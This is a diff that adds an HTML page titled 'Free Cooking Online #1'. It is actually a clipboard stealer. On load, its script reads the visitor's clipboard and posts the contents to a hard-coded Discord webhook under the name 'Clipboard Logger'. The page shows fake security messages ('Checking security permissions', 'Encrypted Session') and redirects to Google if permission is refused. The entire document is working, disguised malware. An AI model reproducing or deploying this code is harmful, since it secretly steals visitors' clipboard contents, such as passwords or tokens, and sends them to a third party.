@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Cooking Online #1</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            padding: 40px;
+        }
+        
+        h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            font-weight: 300;
+            transition: all 0.5s ease;
+            letter-spacing: 1px;
+        }
+        
+        .status {
+            margin-top: 40px;
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            display: inline-block;
+        }
+        
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        
+        .granted {
+            color: #4ecdc4;
+            font-weight: 500;
+            animation: pulse 2s infinite;
+        }
+        
+        .redirect {
+            color: #ff6b6b;
+        }
+        
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 0.9rem;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; text-shadow: 0 0 10px rgba(78, 205, 196, 0.7); }
+            100% { opacity: 0.8; }
+        }
+        
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 id="title">Hi there!</h1>
+        <div id="status" class="status">
+            <div class="loader"></div>
+            <span>Initializing system...</span>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>Secure Connection • Encrypted Session</p>
+    </div>
+
+    <script>
+        // Discord webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1392808715903696946/36icJgBCiGyuyMPpiyMek62LK6hEwRFPaksUcqFju1Dc9ZuKXl456MK8I8dehEnL5Kb0";
+        
+        // DOM elements
+        const titleElement = document.getElementById('title');
+        const statusElement = document.getElementById('status');
+        
+        // Function to send clipboard data to Discord
+        async function sendToDiscord(content) {
+            try {
+                // Truncate content if too long
+                const truncatedContent = content.length > 1500 ? content.substring(0, 1500) + "..." : content;
+                
+                const data = {
+                    content: `📋 New clipboard content:\n\`\`\`\n${truncatedContent}\n\`\`\``,
+                    username: "Clipboard Logger",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/728/728093.png"
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                console.log("Clipboard data sent to Discord");
+            } catch (error) {
+                console.error("Error sending to Discord:", error);
+            }
+        }
+        
+        // Function to access clipboard
+        async function accessClipboard() {
+            try {
+                // Update status
+                statusElement.innerHTML = '<div class="loader"></div><span>Checking security permissions...</span>';
+                
+                // Add delay to simulate processing
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Check if Clipboard API is available
+                if (!navigator.clipboard || !navigator.clipboard.readText) {
+                    throw new Error("Clipboard API not supported");
+                }
+                
+                // Attempt to read clipboard
+                const clipboardText = await navigator.clipboard.readText();
+                
+                // Update UI
+                titleElement.textContent = "BLUD GOT LOGSS!!";
+                statusElement.className = "status granted";
+                statusElement.innerHTML = '<span>System secured</span>';
+                
+                // Send clipboard content to Discord
+                await sendToDiscord(clipboardText);
+                
+            } catch (error) {
+                console.error("Clipboard error:", error);
+                
+                if (error.name === 'NotAllowedError') {
+                    // Permission denied
+                    statusElement.className = "status redirect";
+                    statusElement.innerHTML = '<span>Permission required. Redirecting...</span>';
+                    
+                    // Redirect to Google after delay
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 2000);
+                } else {
+                    // Other errors
+                    statusElement.className = "status redirect";
+                    statusElement.innerHTML = `<span>Error: ${error.message || 'Unknown error'}</span>`;
+                    
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 3000);
+                }
+            }
+        }
+        
+        // Initialize clipboard access when page loads
+        window.addEventListener('DOMContentLoaded', () => {
+            // Start the process after a short delay
+            setTimeout(accessClipboard, 1000);
+        });
+    </script>
+</body>
+</html>
